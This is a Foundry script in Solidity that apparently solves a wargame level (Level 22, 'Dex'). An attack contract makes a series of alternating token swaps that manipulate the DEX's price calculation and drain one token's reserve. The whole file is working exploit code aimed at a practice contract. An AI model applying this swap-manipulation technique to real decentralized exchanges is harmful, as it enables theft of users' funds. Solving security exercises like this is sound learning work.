// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Dex} from "../src/Level22.sol";
import "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

contract Level22Sol is Script {
    Dex public instance = Dex(0x7f2041D22Bf8D693507A9347785C182BBB73285d);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        address token1 = instance.token1();
        address token2 = instance.token2();

        console.log(token1);

        Attack attack = new Attack();

        instance.approve(address(attack), 10);
        address myAddress = address(vm.envAddress("MY_ADDRESS"));
        attack.exploit(myAddress);

        console.log(
            "DEX balance in TOKEN1 is ",
            instance.balanceOf(token1, address(instance))
        );
        vm.stopBroadcast();
    }
}

contract Attack {
    Dex public dex = Dex(0x7f2041D22Bf8D693507A9347785C182BBB73285d);
    address token1 = dex.token1();
    address token2 = dex.token2();

    function exploit(address myAddress) public {
        IERC20(token1).transferFrom(myAddress, address(this), 10);
        IERC20(token2).transferFrom(myAddress, address(this), 10);

        dex.approve(address(dex), type(uint64).max);

        dex.swap(token1, token2, 10);
        dex.swap(token2, token1, 20);
        dex.swap(token1, token2, 24);
        dex.swap(token2, token1, 30);
        dex.swap(token1, token2, 41);

        dex.swap(token2, token1, 45);
    }
}
